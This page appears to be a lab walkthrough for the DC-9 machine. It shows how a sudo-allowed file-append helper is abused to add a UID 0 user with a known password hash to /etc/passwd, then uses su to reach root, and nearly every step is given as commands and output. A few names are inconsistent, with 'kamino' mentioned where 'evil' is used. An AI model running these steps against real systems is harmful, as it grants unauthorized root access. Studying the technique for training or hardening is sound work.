---
layout: default
title: /etc/passwd
parent: Sudo
nav_order: 4
---

# /etc/passwd

---

## Replace /etc/passwd via Sudo

```bash
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test

```

We can run /opt/devstuff/dist/test/test with sudo privileges.

If we try to execute /opt/devstuff/dist/test/test it shows the usage.

```bash
fredf@dc-9:/opt/devstuff/dist/test$ ./test
Usage: python test.py read append

```

We can find the _test.py_ file in _/opt/devstuff/_

```bash
fredf@dc-9:/opt/devstuff/dist/test$ find / -name test.py 2>/dev/null
/opt/devstuff/test.py

```

Reviewing _test.py_ it shows that it reads a file and appends to that file.

```bash
fredf@dc-9:/opt/devstuff$ cat test.py
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()

```

We will exploit this by appending a new user to _/etc/passwd_

First we create the file that will be read in by _test.py_ in /var/tmp

The following will add a root user with the password _i<3hacking_

```bash
fredf@dc-9:/var/tmp$ echo 'evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash' > /var/tmp/evil


fredf@dc-9:/var/tmp$ cat evil
evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash

```

Now we can execute the _/opt/devstuff/dist/test/test_ and read in the _/var/tmp/kamino_ and append to the file _/etc/passwd_

```bash
redf@dc-9:/var/tmp$ sudo /opt/devstuff/dist/test/test /var/tmp/evil /etc/passwd

redf@dc-9:/var/tmp$ cat /etc/passwd

# we see our newly created root user "evil" at the bottom of /etc/passwd
scoots:x:1015:1015:Scooter McScoots:/home/scoots:/bin/bash
janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash

```

Our exploit was successful and now we can switch to the _kamino_ user and have root privileges.

```bash
fredf@dc-9:/var/tmp$ su evil
Password:
root@dc-9:/var/tmp# id
uid=0(root) gid=0(root) groups=0(root)

```
